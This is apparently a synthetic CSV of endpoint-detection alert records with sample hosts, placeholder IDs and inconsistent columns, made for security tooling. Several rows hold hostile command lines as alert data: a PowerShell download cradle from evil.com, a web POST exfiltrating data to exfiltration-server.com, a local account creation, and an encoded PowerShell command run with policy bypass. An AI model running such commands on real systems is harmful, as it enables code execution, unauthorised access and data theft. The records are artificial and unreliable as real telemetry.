event_id,event_type,event_timestamp,event_category,event_description,severity,event_time,category,mitre_technique,host,event_severity,affected_hosts,event_details,action,detect_description,detect_id,technique,src_ip,src_port,protocol,user_name,process_name,technique_name,affected_host,affected_process,affected_file_path,command_line,parent_process,parent_process_command_line,detection_method,recommended_actions,event_version,event_data,event_name,endpoint,data,rule_name,recommendation,event_subtype,container_name,image_name,image_digest,registry,command,source_ip,destination_ip,process_path,username,detection,actor,host_info,event_url,event_hash,detected_by,details,device,source,target,attack_name,tactic,ip_address,process_id,metadata,alert_type,timestamp,detection_info,sensor_id,hostname,ip,user,domain,process_command_line,process_pid,parent_process_name,parent_process_pid,c2,files,detection_source,web_server_url,web_server_method,type,process,network,event,trigger,remediation,artifact_hiding,process_injection,security_control_disablement,file_deletion,name,affected_entities,dst_ip,kill_chain_phases,file,process_execution,registry_modification,cloud_infrastructure_modification,subtype,detection_details,customer_id,event_info,product,mitre,attack_details,description,destination_port,parent_process_id,email_sender,email_recipient,email_subject,email_urls,email_attachments,Severity,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,Recommendation,Title,Tactic,Technique,Affected_Image_Path,Injected_Process_Name,Parent_Process_Name,Injection_Technique,indicators,actions,additional_info,file_info,network_info,Timestamp,Description,Loader_Process_Name,Loader_Technique,event_Source,tactics,recommendations,ip_addresses,mac_addresses,operating_system,agent_version,group_name,destination,threat_severity,threat_category,threat_name,ioc,tags,detect_name,rule_description,triggered_rule,alert_rule_name,alert_rule_id,alert_state,alert_time,src,process_tree,remediation_steps,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,EventID,Category,AffectedHostInfo,DetectionDetails,endpoint_id,web_service_name,web_service_path,ioc_type,ioc_value,process_details,host_details,DetectionId,Details,event_action,event_source,status,application,threat,source_port,file_write,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFilePath,AffectedFileSize,technique_id,event_creator,subtechnique_id,subtechnique,remote_server,mitre_attack_id,cloud_account,org_id,event_event_name,data_source,device_name,file_name,file_size,src_path,dst_path,host_name,file_path,md5_hash,sha256_hash,alert_data,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,file_permission_modification,Domain_Controller_IP,Domain_Controller_Name
9492hbd092,DetectionSummaryEvent,,direct volume access,An attempt to access a volume directly has been detected.,High,2023-03-10T12:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint Detection and Response,"{'process': {'name': 'cmd.exe', 'pid': '123', 'command_line': 'cmd.exe /c net user test test123 /add'}, 'volume': {'name': 'C:', 'access_type': 'Direct', 'operation': 'Write'}}","{'id': 'Endpoint1', 'hostname': 'MyComputer', 'ip_address': '192.168.1.100', 'os': 'Windows 10'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
09430t0dj,threat detection,2023-03-09T12:00:00.000000Z,Dynamic resolution,Dynamic Resolution detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'endpoint', 'hostname': 'DESKTOP-ABC123', 'ip_address': '192.168.1.101'}","{'type': 'process', 'process_name': 'chrome.exe', 'process_command_line': 'chrome.exe www.maliciousdomain.com', 'process_id': '1234'}",Dynamic Resolution,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
123456,alert,,encrypted channel,Encrypted Channel detected,,2023-03-09T12:00:00.000000Z,,,,medium,,,,,,,,,,,powershell.exe,,,,,powershell.exe -ep bypass -noexit -enc JABzAD0ATwB1AHQAcAB1AHQAIAAtAEEAdABlAG0AYQBuAGQAYQBsAHMAIAAtAEkARQBYAD0AaQBlAHgAZgBpAGwAbABlAC4AcABhAGMAawBlAG4AdAAoACkALgBFAHgAZQBsAGQAQwBvAG4AdABlAG4AdAAoACcASQBuAHYAbwBrAGUALgBDAGMAcwBvAHUAdABzAHIAaQBvAG4AOgBUAHkAcABlAGwAaQBjAHkAaQBnAGgAIAAnACkAKQAuAEQAZQBzAHQALgBUAGkAZQBsAGwAaQBzAGkAbgBnACgAJwB7ACAAfQA= ,,,,,,,,,,Encrypted Channel,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.101,1234,"{'customerID': '12345', 'machineName': 'DESKTOP-ABC123', 'domain': 'contoso.com'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,,,,2022-03-08T14:32:47Z,,,,,,,,,,,,,,,,,,,,,,,,,2.0,,,,"{'rule_name': 'MITRE ATT&CK T1499 Endpoint Denial of Service', 'rule_description': 'Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.', 'rule_severity': 'high', 'rule_id': 'MITRE_ID_T1499', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'delivery'}, {'kill_chain_name': 'mitre-attack', 'phase_name': 'exploitation'}], 'event_type': 'endpoint-dos', 'event_description': 'Defender for Endpoint detected an endpoint denial of service (DoS) attack on the system.', 'event_category': 'Denial of Service', 'source': {'process_name': 'cmd.exe', 'command_line': 'cmd.exe /c ping -n 10000 127.0.0.1', 'process_id': '1224'}, 'user_info': {'user_name': 'acme\\jdoe'}, 'host_info': {'hostname': 'WIN10-PC', 'domain': 'acme.local', 'ip_address': '192.168.1.101'}, 'metadata': {'alert_link': 'https://securitycenter.windows.com/alert/1234567890'}, 'recommendation': 'Isolate the affected machine from the network to prevent further damage and investigate the root cause of the attack.'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat_detection,1646749655000,execution gaurdrails,Execution Guardrails Detected,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'id': 'ABC123', 'hostname': 'Workstation-01', 'ip': '192.168.1.100', 'os': 'Windows 10', 'username': 'John.Doe', 'process_name': 'cmd.exe'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,suspicious_activity,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,DetectionSummaryEvent,,data exfiltration,Exfiltration Over Alternative Protocol,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'example-hostname', 'domain': 'example-domain', 'os': 'Windows 10'}",,,,,,,,,,,,,,2023-03-08T12:00:00.000000Z,"{'detection_id': '12345678-1234-1234-1234-123456789012', 'detection_name': 'Exfiltration Detection', 'detection_description': 'Detects exfiltration over alternative protocol', 'detection_time': '2023-03-08T12:00:00.000000Z', 'rule_name': 'Exfiltration Detection Rule', 'rule_id': '12345678-1234-1234-1234-123456789012', 'ioc_info': {'ioc_type': 'protocol', 'ioc_value': 'DNS', 'ioc_description': 'Alternative exfiltration protocol'}, 'command_line': 'nslookup example.com 8.8.8.8'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over C2 Channel Detected,high,,,,,,,,detect,,,,,,,,powershell.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),1234.0,explorer.exe,5678.0,"{'destination': 'evil.com', 'protocol': 'HTTP'}","[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,threat detection,1646749655000,data exfiltration,Exfiltration Over Physical Medium Detected,high,,,,,,,,,,,,,,"{'name': 'USB', 'direction': 'outbound'}",,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,ABC123,DESKTOP-ABC123,192.168.1.100,JohnDoe,DOMAIN,explorer.exe copy SensitiveData.txt E:\,1234.0,,,,"[{'name': 'SensitiveData.txt', 'type': 'exfiltrated'}]",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345678-1234-1234-1234-123456789012,threat detection,2023-03-08T14:30:00Z,exfiltration over web service,Exfiltration Over Web Service Detected,,,,,,high,,,,,,,,,,,explorer.exe,,,,,powershell.exe -c Invoke-WebRequest -Uri http://exfiltration-server.com -Method POST -Body $exfiltrated_data,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,5678,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,http://exfiltration-server.com,POST,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,Attempted Attack,An attempt was made to exploit a public-facing application on the host.,,,,,"{'hostname': 'host-123', 'ip_address': '192.168.0.1', 'mac_address': '00:11:22:33:44:55'}",,,,Exploit Public-Facing Application,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T10:30:00.000Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,2022-03-17T14:30:00Z,Exploitation for Client Execution,Possible Exploitation for Client Execution,high,,,,,,,"{'technique': 'Exploitation for Client Execution', 'affected_process': 'explorer.exe', 'process_id': '1234'}",detect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'module': 'endpoint', 'product': 'falcon', 'sensor_id': '1234567890abcdef', 'hostname': 'WIN-12345', 'ip_address': '192.168.1.100', 'user': 'DOMAIN\\user'}",,,,,,,,,,,,,,,,,,,,,,,,anomaly,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,evade detection,1646749655000,exploit for defensive evasion,An attempt to exploit a vulnerability in order to evade detection or maintain persistence.,high,,,,"{'hostname': 'server01', 'ip_address': '192.168.1.100'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'ioc': [{'type': 'File Hash', 'value': 'f1a4f16db921e4c4efc6b51a6b10a6f7'}, {'type': 'URL', 'value': 'https://malicious-site.com/exploit'}], 'reason': 'Exploit detected'}",,,,,,,,,,,,,,,,,,,,,{'username': 'admin'},,,,,,,,,,,,"{'process_name': 'cmd.exe', 'process_id': '1234', 'file_path': 'C:\\Windows\\system32\\cmd.exe', 'command_line': 'cmd.exe /c echo hello world'}","{'protocol': 'TCP', 'port': '4444', 'remote_address': '192.168.1.100'}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,alert,1646749655000,external remote services,A connection to an external remote service has been detected.,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,Potential External Remote Services Connection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'type': 'network', 'subtype': 'socket', 'event_timestamp': '2022-04-01T14:30:00Z', 'src_ip': '', 'dst_ip': '10.0.0.2', 'src_port': '', 'dst_port': '8080', 'protocol': 'tcp', 'http': {'full_uri': 'http://10.0.0.2:8080', 'user_agent': '', 'referer': '', 'request_method': '', 'response_status_code': ''}, 'remote_service': {'name': 'Unknown', 'type': 'Unknown', 'ports': ['8080', '8443'], 'ipv4': '10.0.0.2', 'ipv6': '', 'url': 'http://10.0.0.2:8080', 'certificate': '', 'encryption': 'Unknown', 'authentication': 'Unknown', 'version': 'Unknown', 'product': 'Unknown', 'organization': 'Unknown'}, 'process': {'cmdline': 'explorer.exe /root,C:\\Windows\\system32', 'path': 'C:\\Windows\\explorer.exe', 'pid': 1234, 'name': 'explorer.exe'}}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
